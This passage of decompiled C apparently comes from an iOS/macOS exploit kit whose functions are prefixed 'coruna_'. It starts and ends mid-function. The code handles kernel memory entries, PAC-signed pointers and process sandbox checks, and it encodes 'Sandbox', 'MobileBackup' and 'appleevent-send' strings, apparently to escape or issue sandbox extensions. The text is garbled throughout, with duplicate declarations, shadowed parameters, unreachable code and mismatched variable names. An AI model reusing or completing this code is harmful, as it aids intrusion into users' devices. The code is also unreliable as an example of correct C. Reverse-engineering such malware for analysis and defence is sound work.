    if (((err == 0) && (*(long *)(handle + 0x118) != 0)) && (*(long *)(handle + 0x120) != 0)) {
      size = _mach_absolute_time();
      *(uint64_t *)(*(long *)(handle + 0x118) + 0x150) = size;
    }
  }
  return;
}
void coruna_mach_absolute_time_18960(uint64_t val)
{
  unsigned long u;
  bool err;
  int err;
  uint64_t size;
  uint64_t version;
  uint64_t port;
  long handle;
  long addr;
  uint32_t tag;
  uint64_t kind;
  double ld11;
  double ld12;
  unsigned long type_id;
  long scratch [7];
  mach_timebase_info_t bootargs;
  
  bootargs.numer = 0;
  bootargs.denom = 0;
  _mach_timebase_info(&bootargs);
  type_id = (unsigned long)bootargs & 0xffffffff;
  u = (unsigned long)bootargs >> 0x20;
  size = _mach_absolute_time();
  err = coruna_fn_ptr_cast_10(val,0x1000000);
  if (err == 0) {
    err = coruna_fn_ptr_cast_10(val,0x100000);
    if (err == 0) {
      err = coruna_fn_ptr_cast_10(val,0x80000);
      if (err == 0) {
        err = coruna_fn_ptr_cast_10(val,0x4000);
        port = 0x23b080000;
        if ((err == 0) && (err = coruna_fn_ptr_cast_10(val,1), err == 0)) {
          return;
        }
        err = coruna_mach_make_memory_entry_2aed0(val,port,scratch);
        if (err != 0) {
        return;
        }
        tag = 0x1f0023ff;
        err = coruna_fn_ptr_cast_10(val,0x1000000);
        if (err == 0) {
        err = coruna_fn_ptr_cast_10(val,0x100000);
        if (err == 0) {
        err = coruna_fn_ptr_cast_10(val,0x80000);
        if (err == 0) {
        err = coruna_fn_ptr_cast_10(val,0x4000);
        tag = 0x1f0003ff;
        if (err != 0) {
        addr = 0x390;
        if ((~*(uint *)(scratch[0] + addr) & 0xf) != 0) {
        ld11 = (double)NEON_ucvtf(u);
        ld12 = (double)NEON_ucvtf(type_id);
        ld11 = (ld11 / ld12) * k_kernel_rodata_word_42ef0 * k_kernel_rodata_word_434e8;
        *(uint32_t *)(addr + scratch[0]) = tag;
        do {
        version = _mach_absolute_time();
        if ((unsigned long)(long)(ld11 + (double)size) <= version) break;
        } while ((~*(uint *)(scratch[0] + addr) & 0xf) != 0);
        coruna_semaphore_timedwait(val,1000);
        }
        coruna_mach_port_deallocate_2b24c(val,scratch);
        return;
        }
        err = coruna_fn_ptr_cast_10(val,1);
        if (err == 0) {
        coruna_mach_port_deallocate_2b24c(val,scratch);
        return;
        }
        err = coruna_call_mach_vm_machine_attribute_1d4f8_20f14();
        err = err == 8;
        handle = 0x388;
        }
        else {
        err = coruna_call_mach_vm_machine_attribute_1d4f8_20f14();
        if (err < 8) {
        addr = 0x3d0;
        if ((~*(uint *)(scratch[0] + addr) & 0xf) != 0) {
        ld11 = (double)NEON_ucvtf(u);
        ld12 = (double)NEON_ucvtf(type_id);
        ld11 = (ld11 / ld12) * k_kernel_rodata_word_42ef0 * k_kernel_rodata_word_434e8;
        *(uint32_t *)(addr + scratch[0]) = tag;
        do {
        version = _mach_absolute_time();
        if ((unsigned long)(long)(ld11 + (double)size) <= version) break;
        } while ((~*(uint *)(scratch[0] + addr) & 0xf) != 0);
        coruna_semaphore_timedwait(val,1000);
        }
        coruna_mach_port_deallocate_2b24c(val,scratch);
        return;
        }
        err = coruna_fn_ptr_cast_10(val,0x200000);
        err = err == 0;
        handle = 0x3c0;
        }
        addr = 0x3f8;
        }
        else {
        err = coruna_call_mach_vm_machine_attribute_1d4f8_20f14();
        if (err < 8) {
        addr = 0x3c8;
        if ((~*(uint *)(scratch[0] + addr) & 0xf) != 0) {
        ld11 = (double)NEON_ucvtf(u);
        ld12 = (double)NEON_ucvtf(type_id);
        ld11 = (ld11 / ld12) * k_kernel_rodata_word_42ef0 * k_kernel_rodata_word_434e8;
        *(uint32_t *)(addr + scratch[0]) = tag;
        do {
        version = _mach_absolute_time();
        if ((unsigned long)(long)(ld11 + (double)size) <= version) break;
        } while ((~*(uint *)(scratch[0] + addr) & 0xf) != 0);
        coruna_semaphore_timedwait(val,1000);
        }
        coruna_mach_port_deallocate_2b24c(val,scratch);
        return;
        }
        err = coruna_fn_ptr_cast_10(val,0x2000000);
        err = err == 0;
        handle = 0x108;
        addr = 0x430;
        }
        if (!err) {
        addr = handle;
        }
        }
        else {
        addr = 0x408;
        }
        if ((~*(uint *)(scratch[0] + addr) & 0xf) != 0) {
        ld11 = (double)NEON_ucvtf(u);
        ld12 = (double)NEON_ucvtf(type_id);
        ld11 = (ld11 / ld12) * k_kernel_rodata_word_42ef0 * k_kernel_rodata_word_434e8;
        *(uint32_t *)(addr + scratch[0]) = tag;
        do {
        version = _mach_absolute_time();
        if ((unsigned long)(long)(ld11 + (double)size) <= version) break;
        } while ((~*(uint *)(scratch[0] + addr) & 0xf) != 0);
        coruna_semaphore_timedwait(val,1000);
        }
        coruna_mach_port_deallocate_2b24c(val,scratch);
        return;
      }
      kind = 0x28e580000;
      port = 0x200000;
    }
    else {
      kind = 0x404e80000;
      port = 0x2000000;
    }
    err = coruna_fn_ptr_cast_10(val,port);
    port = 0x23b700000;
    if (err != 0) {
      port = kind;
    }
  }
  else {
    port = 0x23b700000;
  }
fail:
  err = coruna_mach_make_memory_entry_2aed0(val,port,scratch);
  if (err != 0) {
    return;
  }
  tag = 0x1f0023ff;
  err = coruna_fn_ptr_cast_10(val,0x1000000);
  if (err == 0) {
    err = coruna_fn_ptr_cast_10(val,0x100000);
    if (err == 0) {
      err = coruna_fn_ptr_cast_10(val,0x80000);
      if (err == 0) {
        err = coruna_fn_ptr_cast_10(val,0x4000);
        tag = 0x1f0003ff;
        if (err != 0) {
          addr = 0x390;
          if ((~*(uint *)(scratch[0] + addr) & 0xf) != 0) {
          ld11 = (double)NEON_ucvtf(u);
          ld12 = (double)NEON_ucvtf(type_id);
          ld11 = (ld11 / ld12) * k_kernel_rodata_word_42ef0 * k_kernel_rodata_word_434e8;
          *(uint32_t *)(addr + scratch[0]) = tag;
          do {
          version = _mach_absolute_time();
          if ((unsigned long)(long)(ld11 + (double)size) <= version) break;
          } while ((~*(uint *)(scratch[0] + addr) & 0xf) != 0);
          coruna_semaphore_timedwait(val,1000);
          }
          coruna_mach_port_deallocate_2b24c(val,scratch);
          return;
        }
        err = coruna_fn_ptr_cast_10(val,1);
        if (err == 0) {
          coruna_mach_port_deallocate_2b24c(val,scratch);
          return;
        }
        err = coruna_call_mach_vm_machine_attribute_1d4f8_20f14();
        err = err == 8;
        handle = 0x388;
      }
      else {
        err = coruna_call_mach_vm_machine_attribute_1d4f8_20f14();
        if (err < 8) {
          addr = 0x3d0;
          if ((~*(uint *)(scratch[0] + addr) & 0xf) != 0) {
          ld11 = (double)NEON_ucvtf(u);
          ld12 = (double)NEON_ucvtf(type_id);
          ld11 = (ld11 / ld12) * k_kernel_rodata_word_42ef0 * k_kernel_rodata_word_434e8;
          *(uint32_t *)(addr + scratch[0]) = tag;
          do {
          version = _mach_absolute_time();
          if ((unsigned long)(long)(ld11 + (double)size) <= version) break;
          } while ((~*(uint *)(scratch[0] + addr) & 0xf) != 0);
          coruna_semaphore_timedwait(val,1000);
          }
          coruna_mach_port_deallocate_2b24c(val,scratch);
          return;
        }
        err = coruna_fn_ptr_cast_10(val,0x200000);
        err = err == 0;
        handle = 0x3c0;
      }
      addr = 0x3f8;
    }
    else {
      err = coruna_call_mach_vm_machine_attribute_1d4f8_20f14();
      if (err < 8) {
        addr = 0x3c8;
        if ((~*(uint *)(scratch[0] + addr) & 0xf) != 0) {
        ld11 = (double)NEON_ucvtf(u);
        ld12 = (double)NEON_ucvtf(type_id);
        ld11 = (ld11 / ld12) * k_kernel_rodata_word_42ef0 * k_kernel_rodata_word_434e8;
        *(uint32_t *)(addr + scratch[0]) = tag;
        do {
        version = _mach_absolute_time();
        if ((unsigned long)(long)(ld11 + (double)size) <= version) break;
        } while ((~*(uint *)(scratch[0] + addr) & 0xf) != 0);
        coruna_semaphore_timedwait(val,1000);
        }
        coruna_mach_port_deallocate_2b24c(val,scratch);
        return;
      }
      err = coruna_fn_ptr_cast_10(val,0x2000000);
      err = err == 0;
      handle = 0x108;
      addr = 0x430;
    }
    if (!err) {
      addr = handle;
    }
  }
  else {
    addr = 0x408;
  }
done:
  if ((~*(uint *)(scratch[0] + addr) & 0xf) != 0) {
    ld11 = (double)NEON_ucvtf(u);
    ld12 = (double)NEON_ucvtf(type_id);
    ld11 = (ld11 / ld12) * k_kernel_rodata_word_42ef0 * k_kernel_rodata_word_434e8;
    *(uint32_t *)(addr + scratch[0]) = tag;
    do {
      version = _mach_absolute_time();
      if ((unsigned long)(long)(ld11 + (double)size) <= version) break;
    } while ((~*(uint *)(scratch[0] + addr) & 0xf) != 0);
    coruna_semaphore_timedwait(val,1000);
  }
  coruna_mach_port_deallocate_2b24c(val,scratch);
  return;
}
void coruna_kernel5_via_mach_port_deallocate_2b24c(uint64_t val,long handle,uint64_t *id_2)
{
  int err;
  
  id_2[5] = 0;
  id_2[4] = 0;
  id_2[7] = 0;
  id_2[6] = 0;
  id_2[1] = 0;
  *id_2 = 0;
  id_2[3] = 0;
  id_2[2] = 0;
  err = coruna_mach_make_memory_entry_2aed0(val,handle + 0x40000);
  if (err != 0) {
    coruna_mach_port_deallocate_2b24c(val,id_2);
  }
  return;
}
void coruna_kernel5_via_kernel5_via_kernel5_via_pacia_12_6(long handle,unsigned long arg)
{
  uint8_t scratch[40];
  
  coruna_kernel5_via_kernel5_via_pacia_12_6(handle,arg & (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff),scratch);
  return;
}
void coruna_mach_absolute_time_18cfc(uint64_t val,uint64_t *id_2)
{
  int err;
  uint64_t u;
  uint64_t size;
  unsigned long version;
  double ld5;
  double ld6;
  mach_timebase_info_t scratch;
  
  version = *(unsigned long *)*id_2;
  if ((version & 0x90000000) == 0) {
    err = coruna_pacia_12(val,0x1100000);
    if (err != 0) {
      coruna_semaphore_timedwait(val,1000);
    }
    *(unsigned long *)*id_2 = version | 0x80000000;
    *(uint8_t *)(id_2 + 7) = 1;
    scratch.numer = 0;
    scratch.denom = 0;
    _mach_timebase_info(&scratch);
    ld5 = (double)NEON_ucvtf((unsigned long)scratch >> 0x20);
    ld6 = (double)NEON_ucvtf((unsigned long)scratch & 0xffffffff);
    ld5 = (ld5 / ld6) * k_kernel_rodata_word_33920;
    u = _mach_absolute_time();
    ld5 = ld5 * k_kernel_rodata_word_336d8;
    do {
      size = _mach_absolute_time();
      if ((unsigned long)(long)(ld5 + (double)u) <= size) goto fail;
    } while (((uint)*(uint64_t *)*id_2 >> 0x1c & 1) == 0);
  }
  else {
fail:
    if (*(char *)(id_2 + 7) != '\0') {
      coruna_mach_absolute_time_2045c(val,id_2);
    }
  }
  return;
}
void coruna_mach_absolute_time_2045c(uint64_t val,uint64_t *id_2)
{
  int err;
  uint64_t u;
  uint64_t size;
  unsigned long version;
  double ld5;
  double ld6;
  mach_timebase_info_t scratch;
  
  if (*(char *)(id_2 + 7) != '\0') {
    version = *(unsigned long *)*id_2;
    err = coruna_pacia_12(val,0x1100000);
    if (err != 0) {
      coruna_semaphore_timedwait(val,1000);
    }
    *(unsigned long *)*id_2 = version & 0xffffffff2fffffff | 0x40000000;
    scratch.numer = 0;
    scratch.denom = 0;
    _mach_timebase_info(&scratch);
    ld5 = (double)NEON_ucvtf((unsigned long)scratch >> 0x20);
    ld6 = (double)NEON_ucvtf((unsigned long)scratch & 0xffffffff);
    ld5 = (ld5 / ld6) * k_kernel_rodata_word_33920;
    u = _mach_absolute_time();
    ld5 = ld5 * k_kernel_rodata_word_336d8;
    do {
      size = _mach_absolute_time();
      if ((unsigned long)(long)(ld5 + (double)u) <= size) {
        return;
      }
    } while (((uint)*(uint64_t *)*id_2 >> 0x1c & 1) != 0);
    *(uint8_t *)(id_2 + 7) = 0;
  }
  return;
}
void coruna_kernel5_via_syscall(uint64_t val,uint64_t id_2)
{
  void *ptr;
  int err;
  uint64_t scratch;
  uint64_t scratch;
  void *bootargs;
  unsigned long bootargs;
  uint thread_attr;
  void *host_info;
  
  host_info = (void *)0x0;
  thread_attr = 0;
  err = coruna_kernel5_via_pacia_2(val,0,0,&host_info,&thread_attr,0);
  ptr = host_info;
  if (err != 0) {
    scratch = 0x786f62646e6153;
    bootargs = (unsigned long)thread_attr;
    bootargs = host_info;
    scratch = id_2;
    coruna_syscall(&scratch,1,&scratch);
    if (ptr != (void *)0x0) {
      _free(ptr);
    }
  }
  return;
}
void coruna_kernel5_via_pacia_2(long handle,uint64_t *val,uint *size,uint64_t *id_2,uint *flags_2,
                 int flags)
{
  int err;
  long handle;
  void *ptr;
  uint u;
  void *buf;
  long addr;
  long off;
  long base;
  unsigned long size;
  long ctx_val;
  long scratch;
  uint bootargs;
  uint thread_attr;
  uint64_t host_info;
  
  bootargs = 0;
  err = *(int *)(handle + 0x140);
  if (err < 0x1f54) {
    if (err == 0x1809) {
      addr = 0;
      u = 0x10;
      if (*(unsigned long *)(handle + 0x158) < 0x18091e01f00000) {
        u = 0x20;
      }
      base = 4;
      if (*(unsigned long *)(handle + 0x158) < 0x18091e01f00000) {
        base = 8;
      }
      ctx_val = 0x30;
    }
    else {
      if (err != 0x1c1b && err != 0x1f53) {
        return;
      }
      addr = 0x10;
      base = 4;
      ctx_val = 0x48;
      u = 0x10;
    }
  }
  else {
    if (err < 0x225c) {
      if (err != 0x1f54 && err != 0x2258) {
        return;
      }
    }
    else if (err != 0x225c) {
      if (err != 0x2712) {
        return;
      }
      u = 0x10;
      base = 4;
      ctx_val = 0x18;
      addr = 0x18;
      goto fail;
    }
    u = 0x10;
    base = 4;
    ctx_val = 0x18;
    addr = 0x10;
  }
fail:
  off = *(long *)(handle + 0x398);
  handle = coruna_pacia(handle,off);
  if (handle == 0) {
    return;
  }
  handle = off;
  if (0x1f5418ffffffff < *(unsigned long *)(handle + 0x158)) {
    err = coruna_kernel5_residual_257(handle,off + addr,&scratch);
    if (err == 0) {
      return;
    }
    addr = coruna_pacia(handle,scratch);
    handle = scratch;
    if (addr == 0) {
      return;
    }
  }
  err = coruna_kernel5_residual_257(handle,handle + ctx_val,&scratch);
  if (err == 0) {
    return;
  }
  if (scratch == 0) {
    ptr = (void *)0x0;
done:
    if ((val == (uint64_t *)0x0) && (size == (uint *)0x0)) {
      *id_2 = ptr;
      *flags_2 = bootargs;
      return;
    }
    if (flags == 0) {
      err = coruna_kernel5_residual_257(handle,off,&scratch);
      if (err != 0) goto cleanup;
check_ok:
      buf = (void *)0x0;
    }
    else {
      scratch = coruna_macho_cstring_198ac(handle);
      if (scratch == 0) goto check_ok;
cleanup:
      err = coruna_kernel5_residual_257(handle,scratch,&host_info);
      if (err == 0) goto check_ok;
      err = coruna_ret_stub_6(handle,scratch + *(int *)(handle + 0x168),4,&thread_attr);
      buf = (void *)0x0;
      if ((((err != 0) && (size = (unsigned long)thread_attr, thread_attr < 0x80001)) &&
          (buf = _malloc(size), buf != (void *)0x0)) &&
         (err = coruna_ret_stub_6(handle,host_info,size,buf), err != 0)) {
        *id_2 = ptr;
        *flags_2 = bootargs;
        if (val == (uint64_t *)0x0) {
          return;
        }
        if (size == (uint *)0x0) {
          return;
        }
        *val = buf;
        *size = thread_attr;
        return;
      }
    }
    {
      if (buf != (void *)0x0) {
      _free(buf);
      }
      return;
    }
  }
  else {
    scratch = coruna_pacia(handle);
    if (scratch == 0) {
      return;
    }
    err = coruna_ret_stub_6(handle,(base - (unsigned long)u) + scratch,4,&bootargs);
    if (err == 0) {
      return;
    }
    bootargs = bootargs - u;
    size = (unsigned long)bootargs;
    if (0x3ff < bootargs - 1) {
      return;
    }
    ptr = _malloc(size);
    if (ptr == (void *)0x0) {
      return;
    }
    err = coruna_ret_stub_6(handle,scratch,size,ptr);
    if (err != 0) goto done;
    buf = (void *)0x0;
  }
  _free(ptr);
skip:
  if (buf != (void *)0x0) {
    _free(buf);
  }
  return;
}
void coruna_kernel5_via_pacia_12_8(long handle,unsigned long arg)
{
  uint8_t *ptr;
  int err;
  unsigned long u;
  long handle;
  uint64_t scratch;
  uint bootargs;
  void *thread_attr;
  uint host_info;
  void *serial_buf;
  char action [8];
  uint5 scratch;
  uint32_t bootargs;
  void *block_ctx;
  unsigned long thread_attr;
  long stack_guard;
  
  ptr = k_kernel_mach_task_self_slot;
  stack_guard = *(long *)k_kernel_stack_chk_guard_slot;
  u = coruna_kernel5_via_kernel5_via_kernel5_via_pacia_5_2(handle,*(uint32_t *)k_kernel_mach_task_self_slot);
  if (!((int)u == 0)) {
    if ((arg & 1) == 0) {
    err = coruna_pacia_12(handle,4);
    if (err != 0) {
    handle = coruna_kernel5_via_kernel5_via_pacia_10(handle,*(uint32_t *)ptr);
    u = 0;
    {
      if (*(long *)k_kernel_stack_chk_guard_slot == stack_guard) {
      return;
      }
      ___stack_chk_fail(u);
    }
    if (*(long *)(&k_kernel_slot_18e8 + handle) == 0) {
    u = 0;
    {
      if (*(long *)k_kernel_stack_chk_guard_slot == stack_guard) {
      return;
      }
      ___stack_chk_fail(u);
    }
    }
    u = coruna_kernel5_via_kernel5_via_kernel5_via_semaphore_timedwait_2(handle,handle);
    {
      if (*(long *)k_kernel_stack_chk_guard_slot == stack_guard) {
      return;
      }
      ___stack_chk_fail(u);
    }
    coruna_ctx_clear_flag(handle,4);
    }
    }
    else {
    handle = coruna_pacia(handle,*(uint64_t *)(handle + 0x398));
    if ((handle != 0) && (err = coruna_pacia_12(handle,4), err == 0)) {
    u = coruna_pthread_attr_setdetachstate(handle,*(uint32_t *)(handle + 0x37c),0);
    if ((int)u != 0) {
    handle = *(long *)(&k_kernel_slot_18e0 + handle);
    if (handle == 0) {
    action[0] = '\0';
    action[1] = '\0';
    action[2] = '\0';
    action[3] = '\0';
    action[4] = '\0';
    action[5] = '\0';
    action[6] = '\0';
    action[7] = '\0';
    handle = coruna_kernel5_via_kernel5_via_kernel5_via_kernel5_via_kernel5_via_thread_get_state_2(handle,*(uint32_t *)ptr,action);
    *(long *)(&k_kernel_slot_18e0 + handle) = handle;
    *(unsigned long *)(&k_kernel_slot_18e8 + handle) = coruna_cat(action,action);
    }
    coruna_kernel5_via_kernel5_via_kernel5_via_kernel5_via_thread_get_state(handle,handle,10);
    if (*(int *)(handle + 0x140) < 0x1c1b) {
    serial_buf = (void *)0x0;
    host_info = 0;
    thread_attr = (void *)0x0;
    bootargs = 0;
    err = coruna_kernel5_via_pacia_2(handle,&serial_buf,&host_info,&thread_attr,&bootargs,1);
    if (err == 0) {
    err = -1;
    }
    else {
    err = coruna_kernel5_residual_243(handle,serial_buf,host_info);
    if (err == 0) {
    err = -1;
    }
    else {
    scratch = 0x786f62646e6153;
    action = SUB85(serial_buf,0);
    action = (uint32_t)((unsigned long)serial_buf >> 0x28);
    scratch = (uint5)host_info;
    bootargs = 0;
    thread_attr = (unsigned long)bootargs;
    block_ctx = thread_attr;
    err = coruna_syscall(&scratch,0,action);
    }
    if (serial_buf != (void *)0x0) {
    _free(serial_buf);
    }
    if (thread_attr != (void *)0x0) {
    _free(thread_attr);
    }
    }
    }
    else {
    action[0] = s_MobileBackup_0003324d[0];
    action[1] = s_MobileBackup_0003324d[1];
    action[2] = s_MobileBackup_0003324d[2];
    action[3] = s_MobileBackup_0003324d[3];
    action[4] = s_MobileBackup_0003324d[4];
    action[5] = s_MobileBackup_0003324d[5];
    action[6] = s_MobileBackup_0003324d[6];
    action[7] = s_MobileBackup_0003324d[7];
    scratch = s_MobileBackup_0003324d[8];
    scratch = s_MobileBackup_0003324d[9];
    scratch = s_MobileBackup_0003324d[10];
    scratch = s_MobileBackup_0003324d[0xb];
    scratch = s_MobileBackup_0003324d[0xc];
    err = coruna_kernel5_via_syscall(handle,action);
    }
    coruna_pthread_attr_setdetachstate(handle,*(uint32_t *)(handle + 0x37c),*(uint64_t *)(handle + 0x3a8));
    if (err == 0) {
    coruna_ctx_set_flag(handle,4);
    }
    u = (unsigned long)(err == 0);
    }
    {
      if (*(long *)k_kernel_stack_chk_guard_slot == stack_guard) {
      return;
      }
      ___stack_chk_fail(u);
    }
    }
    }
    u = 1;
  }
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == stack_guard) {
    return;
  }
  ___stack_chk_fail(u);
}
void coruna_kernel5_via_call_mach_vm_machine_attribute_1d4f8_2(long handle,long addr_2,uint64_t val)
{
  long handle;
  int err;
  
  if (((handle != 0) && (addr_2 != 0)) &&
     (err = coruna_kernel5_via_kernel5_via_kernel5_via_pacia_5_2(handle,*(uint32_t *)k_kernel_mach_task_self_slot), err != 0)) {
    if (*(long *)(handle + 0x3a8) == 0) {
      coruna_kernel5_via_helper_5d2c_32264(val);
    }
    handle = *(long *)(&k_kernel_slot_18f0 + handle) +
            (unsigned long)(uint)((*(int *)(handle + 0x37c) + 1) * *(int *)(handle + 0x168));
    if (((*(int *)(&k_kernel_slot_1930 + handle) == -1) || (*(int *)(&k_kernel_slot_1934 + handle) == -1)) ||
       ((*(int *)(&k_kernel_slot_1940 + handle) == -1 ||
        ((*(long *)(handle + 0x218) == 0 || (*(char *)(handle + 0xc) != '\0')))))) {
      err = coruna_call_mach_vm_machine_attribute_1d4f8(handle,handle,0);
    }
    else {
      err = coruna_kernel5_via_mach_port_deallocate_2b24c_2(handle,handle,0);
    }
    if (err != 0) {
      coruna_kernel5_via_helper_5d2c_32264(val);
    }
  }
  return;
}
void coruna_sandbox_check(int flags)
{
  uint8_t *ptr;
  pid_t lp2;
  int err;
  
  lp2 = _getpid();
  err = _sandbox_check(lp2,0,0);
  if (err != 0) {
    lp2 = _getpid();
    ptr = k_kernel_sandbox_check_no_report_slot;
    err = _sandbox_check(lp2,"mach-lookup",*(uint *)k_kernel_sandbox_check_no_report_slot | 2);
    if (err == 0) {
      lp2 = _getpid();
      err = _sandbox_check(lp2,"mach-lookup",*(uint *)ptr | 2);
      if (err != 0 && flags != 0) {
        lp2 = _getpid();
        err = _sandbox_check(lp2,"syscall-unix",*(uint32_t *)ptr);
        if ((err != 1) && (err = _socket(2,2,0), err != -1)) {
          _close(err);
        }
      }
    }
  }
  return;
}
void coruna_sandbox_check_19840(long handle)
{
  pid_t lp1;
  int err;
  
  lp1 = _getpid();
  err = _sandbox_check(lp1,0,0);
  if ((err == 0) || (err == 1)) {
    *(char *)(handle + 10) = (char)err;
  }
  return;
}
void coruna_macho_cstring_198ac(long handle)
{
  uint8_t *ptr;
  int err;
  long handle;
  long addr;
  unsigned long u;
  uint8_t scratch[24];
  uint8_t bootargs[24];
  
  if (*(long *)(handle + 0x5c0) != 0) {
    return;
  }
  if (((*(long *)(handle + 0x118) == 0) || (*(long *)(handle + 0x120) == 0)) ||
     (handle = *(long *)(*(long *)(handle + 0x118) + 0x130), handle == 0)) {
    err = coruna_pacia_12(handle,0x1000);
    ptr = &k_kernel_slot_1d18;
    if (err != 0) {
      ptr = &k_kernel_slot_19f8;
    }
    handle = *(long *)(ptr + handle);
    if (handle == 0) {
      return;
    }
    coruna_macho_map_segsect(bootargs,handle,"__TEXT","__cstring");
    addr = coruna_kernel5_via_kernel5_via_cat(bootargs,"appleevent-send",0,1);
    if (addr == 0) {
      return;
    }
    coruna_macho_map_segsect(scratch,handle,"__DATA_CONST","__const");
    addr = coruna_kernel5_via_kernel5_via_kernel5_via_pacia_4(scratch,addr,*(uint8_t *)(handle + 0x34),1);
    if (addr == 0) {
      return;
    }
    if (*(int *)(handle + 0x140) < 0x1c1b) {
      if (*(int *)(handle + 0x140) < 0x1809) {
        u = coruna_pacia_2(handle);
        addr = coruna_kernel5_via_kernel5_via_kernel5_via_pacia_4_3(handle,addr + (u & 0xffffffff) * -2);
      }
      else {
        addr = addr + -0x80;
      }
    }
    else {
      addr = addr + -0xb8;
    }
    handle = coruna_pacia(handle,addr);
    if (handle == 0) {
      return;
    }
    if ((*(long *)(handle + 0x118) != 0) && (*(long *)(handle + 0x120) != 0)) {
      *(long *)(*(long *)(handle + 0x118) + 0x130) = handle;
    }
  }
  *(long *)(handle + 0x5c0) = handle;
  return;
}
void coruna_kernel5_residual_243(long handle,short *arg,uint64_t val)
{
  int err;
  long handle;
  uint u;
  long addr;
  int status;
  void *ptr;
  uint size;
  long off;
  unsigned long version;
  uint port;
  uint scratch;
  
  if (((*(int *)(handle + 0x140) == 0x1c1b || *(int *)(handle + 0x140) == 0x1809) &&
      (size = (uint)val, 0xb < size)) && (-1 < *arg)) {
    off = (unsigned long)*(byte *)((long)arg + 5) * 2;
    addr = (unsigned long)*(byte *)(arg + 5) + (unsigned long)(ushort)arg[4] +
            (unsigned long)*(byte *)((long)arg + 0xb);
    handle = off + addr * 2 + 0xc;
    port = (uint)handle;
    if (port <= size) {
      u = port + (uint)*(byte *)(arg + 2) * 2;
      err = 0;
      if ((u & 6) != 0) {
        err = 8 - (u & 6);
      }
      u = err + u;
      scratch = u;
      ptr = _calloc((unsigned long)(size << 3),1);
      if (ptr != (void *)0x0) {
        if (port < u) {
          version = 0;
          err = (int)addr * 2 + (int)off + 0xc;
          while (size = (uint)*(ushort *)((long)arg + version + handle), size != 0) {
            size = u + size * 8;
            if (((size < (uint)(err + (int)version)) ||
                (status = coruna_kernel5_residual_244(arg,val,ptr,u,size,&scratch), status != 0)) ||
               (size = (int)version + 2, version = (unsigned long)size, scratch <= err + size)) break;
          }
        }
        _free(ptr);
      }
    }
  }
  return;
}
void coruna_kernel5_residual_244(long handle,uint64_t val,long addr_2,uint64_t id_2,uint size,
                 uint *flags_2)
{
  char *ptr;
  int err;
  
  if ((size + 8 <= (uint)val) && (*(char *)(addr_2 + (unsigned long)(size >> 3)) == '\0')) {
    *(uint8_t *)(addr_2 + (unsigned long)(size >> 3)) = 1;
    if (size < *flags_2) {
      *flags_2 = size;
    }
    ptr = (char *)(handle + (unsigned long)size);
    if (*ptr == '\x01') {
      if ((*(ushort *)(ptr + 1) & 1) != 0) {
        *(ushort *)(ptr + 1) = *(ushort *)(ptr + 1) & 0xfffa;
      }
    }
    else {
      err = coruna_kernel5_residual_244(handle,val,addr_2,id_2,
                           (int)id_2 + (uint)*(ushort *)(ptr + 4) * 8,flags_2);
      if (err == 0) {
        coruna_kernel5_residual_244(handle,val,addr_2,id_2,
                     (int)id_2 + (uint)*(ushort *)(ptr + 6) * 8,flags_2);
      }
    }
  }
  return;
}
void coruna_kernel5_residual_245(uint64_t val,char *path,uint64_t *id_2)
{
  int err;
  size_t ls2;
  uint64_t scratch;
  
  ls2 = _strlen(path);
  err = coruna_kernel5_via_pacia_3(val,path,ls2 + 1,&scratch);
  if (err != 0) {
    *id_2 = scratch;
  }
  return;
}
void coruna_kernel5_via_pacia_3(long handle,char *path,size_t len,long *addr_2)
{
  uint u;
  int err;
  long handle;
  long addr;
  uint64_t size;
  char *ptr;
  void *ptr;
  unsigned long version;
  unsigned long port;
  uint64_t *ptr;
  uint scratch;
  long bootargs;
  long thread_attr;
  uint64_t host_info;
  uint64_t scratch;
  uint64_t serial_buf;
  uint64_t bootargs;
  uint64_t action;
  uint64_t thread_attr;
  uint64_t block_ctx;
  uint7 host_info;
  uint8_t serial_buf;
  long stack_guard;
  
  stack_guard = *(long *)k_kernel_stack_chk_guard_slot;
  if ((*(long *)(&k_kernel_slot_1a00 + handle) != 0) &&
     (handle = coruna_kernel5_residual_227(*(long *)(&k_kernel_slot_1a00 + handle),path,len), handle != 0)) {
    *addr_2 = handle;
fail:
    size = 1;
    {
      if (*(long *)k_kernel_stack_chk_guard_slot != stack_guard) {
      ___stack_chk_fail(size);
      }
      return;
    }
  }
  ptr = *(void **)(&k_kernel_slot_1d10 + handle);
  if (ptr == (void *)0x0) {
    if (((*(long *)(handle + 0x118) == 0) || (*(long *)(handle + 0x120) == 0)) ||
       (handle = *(long *)(*(long *)(handle + 0x118) + 0x108), handle == 0)) {
      handle = coruna_find_mod_init(*(uint64_t *)(&k_kernel_slot_19f8 + handle));
      if ((handle != 0) && (addr = coruna_pacia(handle,handle), addr != 0)) {
        if ((*(long *)(handle + 0x118) != 0) && (*(long *)(handle + 0x120) != 0)) {
          *(long *)(*(long *)(handle + 0x118) + 0x108) = handle;
        }
        goto cleanup;
      }
    }
    else {
cleanup:
      err = coruna_kernel5_via_kernel5_via_kernel5_via_thread_get_state(handle,handle + 0x14,&scratch);
      if (((err != 0) && (scratch < 0x401)) &&
         ((err = coruna_kernel5_residual_257(handle,handle + 0x20,&bootargs), err != 0 &&
          (handle = coruna_pacia(handle,bootargs), u = scratch, handle != 0)))) {
        version = (unsigned long)scratch;
        ptr = _calloc(version * 0x48,1);
        if (ptr != (void *)0x0) {
          if (u == 0) {
            scratch = 0;
          }
          else {
            port = 0;
            ptr = (uint64_t *)((long)ptr + 8);
            do {
              err = coruna_kernel5_residual_257(handle,bootargs +
                                           (unsigned long)(uint)(*(int *)(handle + 0x168) * (int)port),
                                   &thread_attr);
              if ((((err == 0) || (handle = coruna_pacia(handle,thread_attr), handle == 0)) ||
                  (err = coruna_kernel5_residual_257(handle,thread_attr + 0x50,&thread_attr), err == 0)) ||
                 (err = coruna_ret_stub_6(handle,thread_attr + 0x10,0x40,&host_info), err == 0)) {
check_ok:
                _free(ptr);
                goto skip;
              }
              serial_buf = 0;
              ptr[1] = scratch;
              *ptr = host_info;
              ptr[3] = bootargs;
              ptr[2] = serial_buf;
              ptr[5] = thread_attr;
              ptr[4] = action;
              ptr[7] = (unsigned long)host_info;
              ptr[6] = block_ctx;
              err = coruna_kernel5_residual_257(handle,thread_attr + 0x9c,&thread_attr);
              if (err == 0) goto check_ok;
              ptr[-1] = thread_attr;
              port = port + 1;
              ptr = ptr + 9;
            } while (version != port);
          }
          *(void **)(&k_kernel_slot_1d10 + handle) = ptr;
          *(uint *)(&k_kernel_slot_1d08 + handle) = scratch;
          {
            if (0x3f < len) {
            len = 0x40;
            }
            if (scratch != 0) {
